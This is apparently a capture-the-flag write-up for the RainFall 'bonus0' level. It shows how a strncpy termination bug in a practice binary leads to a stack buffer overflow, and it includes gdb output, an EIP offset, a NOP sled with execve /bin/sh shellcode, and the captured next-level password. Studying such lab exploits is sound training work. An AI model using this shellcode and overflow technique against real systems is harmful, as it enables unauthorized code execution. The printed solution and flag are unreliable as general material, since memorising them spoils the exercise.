## BONUS 0

Ressources:
- [Disassembled code](disassembled_code.md)
- [Source code](srcs/bonus0.c)

*I recommend to read the resources before you start to read the solution.*

To solve this level we will use a `strncpy()` special feature.

``` shell
Note that it does not NUL terminate chararray because the length of the source string is
     greater than or equal to the length argument.

[...]

SECURITY CONSIDERATIONS
     The strcpy() function is easily misused in a manner which enables malicious users to
     arbitrarily change a running program's functionality through a buffer overflow attack.
```

That's means that if we give a string with a length greater than the length of the destination string, strncpy() gonna return a string not NULL terminated. Let's try by ourselves.

```shell
bonus0@RainFall:~$ ./bonus0
 -
012345678901234567890123456789
 -
Hey
01234567890123456789Hey Hey
```

Since the first string doesn't end with a NULL character, strcpy() doesn't know when to stop. So we can try to overflow the destination string.

```shell
bonus0@RainFall:~$ ./bonus0
 -
012345678901234567890123456789
 -
01234567890123456789
0123456789012345678901234567890123456789�� 01234567890123456789��
Segmentation fault (core dumped)
```

Perfect, the main buffer is 42 bytes long but we can write 61 characters. We can then inject a **ShellCode** in the first `read()` call, then change the return value in the second by a **Buffer Overflow**.

To do that we need to create a ShellCode, find the EIP and the address where the ShellCode will be stored.

---

#### EIP

```shell
bonus0@RainFall:~$ gdb -q bonus0
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -
012345678901234567890123456789
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa�� Aa0Aa1Aa2Aa3Aa4Aa5Aa��

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```

The EIP offset is at **9**.

---

#### Buffer address

```shell
bonus0@RainFall:~$ gdb -q bonus0
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) b *0x080485c5
Breakpoint 1 at 0x80485c5
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAA[...]AAAAAAAAA
 -
A
AAAAAAAAAAAAAAAAAAAAA A

Breakpoint 1, 0x080485c5 in main ()
(gdb) x/32x $esp - 0x1008
0xbfffe6a8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6b8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6c8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6d8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6e8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6f8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe708:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe718:	0x00614141	0x00000000	0x00000000	0x00000000
```

Perfect we can now use one of these addresses as the address of our ShellCode.

ShellCode address -> `0xbfffe6c8`

---

### Payload

Now we have everything we need to create a payload. You can find below the recipe.

`First input -> 'x * NOOP' + 'ShellCode'`

`Second input -> '9 * Offset_Character' + 'ShellCode address' + '8 * Offset_Character'`

#### *Why 8 characters at the end ?*

*Because this string will be copied twice, the first time to fill the buffer then to overflow the buffer. Our EIP has been found with a second input of size 20, so our input must be size 20 too.*

We can know create our own payload.

`python -c 'print "\x90" * 200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"' > /tmp/payload_1`

`python -c 'print("\x42" * 9 + "\xc8\xe6\xff\xbf" + "\x42"*10)' > /tmp/payload_2`

Perfect, we just have to inject the payload into the program.

```shell
bonus0@RainFall:~$ (cat /tmp/payload_1; cat /tmp/payload_2; echo "cat /home/user/bonus1/.pass") | ./bonus0
 -
 -
��������������������BBBBBBBBB����BBBBBBB�� BBBBBBBBB����BBBBBBB��
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
